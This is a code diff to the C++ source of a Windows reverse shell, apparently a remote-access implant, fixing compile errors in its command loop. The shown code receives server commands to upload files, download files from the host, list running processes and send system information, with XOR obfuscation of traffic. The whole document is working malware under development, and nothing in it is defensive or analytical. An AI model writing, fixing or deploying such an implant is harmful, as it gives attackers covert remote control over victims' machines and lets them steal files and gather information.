@@ -16,7 +16,7 @@ Windows reverse shell
 #include <winsock.h>
 #include <iptypes.h>
 #include <iphlpapi.h>
-#include <fileapi.h>
+//#include <fileapi.h>
 #include <string.h>
 #include <rpc.h>
 #pragma comment(lib, "Ws2_32.lib")
@@ -33,7 +33,7 @@ using namespace std;
 // used to encrypt/decrypt data
 char* xor_func(char msg[]) {
 	for (int i = 0; i < strlen(msg); i++) {
-		msg[i] ^= '♥';
+		msg[i] ^= 'P';
 	}
 }
 
@@ -388,7 +388,7 @@ SOCKET getConnected() {
     return sock;
 }
 
-int main(int argc, char const* argv[]) {
+int main() {
 	string filepath;
 	int cmd;
 	int command_packet_len;
@@ -401,7 +401,7 @@ int main(int argc, char const* argv[]) {
 
 	while(true) {
 		std::string procs;
-		
+		int offset = 0;
 		int getcmd;
 		memset(buf,0,DEFAULT_BUFLEN);
 		memset(recvbuf,0,DEFAULT_BUFLEN);
@@ -420,12 +420,14 @@ int main(int argc, char const* argv[]) {
 		printf("cmd int: %d", cmd); // debug
 
 		switch(cmd) {
-			case -1: //end
+			case -1: { //end
 				printf("Shutting down"); //debug
 				shutdown(sock, 2);
 				send(sock, buf, strlen(buf), 0);
 				return 0;
-			case 0:
+			} break;
+				
+			case 0: {
 				printf("From upload buffer: %s\n", buf);  //debug
 				const char* filename = "received_file.txt";
 				int confirm = handle_upload(sock, filename); // receive the file
@@ -439,8 +441,9 @@ int main(int argc, char const* argv[]) {
             	 // tell server client recieved the file (or not)
             	xor_func(buf);
             	send(sock, buf, strlen(buf), 0);
-				break;
-			case 1:
+			} break;
+				
+			case 1: {
 				printf("Download"); // debug
 				// get filepath from server
 				int bytes_received = recv(sock, recvbuf, DEFAULT_BUFLEN, 0);				
@@ -450,16 +453,14 @@ int main(int argc, char const* argv[]) {
 				filepath = recvbuf;
 				// recvbuf[bytes_received] = '\0';
 				
-
-				
 				handle_download(sock, filepath); // fix
 				// read command_packet_length bytes into filename
 				// open filename, send chunks back out socket
-				break;
-			case 2:
+			} break;
+				
+			case 2: {
 				printf("processes");
 				procs = listProcesses();
-				int offset = 0;
 				printf("list processes length: %d", procs.length());
 				while (offset < procs.length()) {
 					string chunk = procs.substr(offset, DEFAULT_BUFLEN);
@@ -473,11 +474,12 @@ int main(int argc, char const* argv[]) {
 				strcpy(buf, "gettfouttahereistfg"); // send string to signify end of message
 				xor_func(buf);
 				send(sock, buf, strlen(buf), 0);
-				break;
-			case 3:
+				
+			} break;
+				
+			case 3: {
 				printf("systeminfo");
 				procs = getSysInfo();
-				int offset = 0;
 				printf("systeminfo length: %d", procs.length());
 				while (offset < procs.length()) {
 					string chunk = procs.substr(offset, DEFAULT_BUFLEN);
@@ -491,7 +493,9 @@ int main(int argc, char const* argv[]) {
 				strcpy(buf, "gettfouttahereistfg"); // send string to signify end of message
 				xor_func(buf); // xor end string
 				send(sock, buf, strlen(buf), 0); //send end string
-				break;
+				
+			} break;
+				
 		}
 		//free(path);
 	}
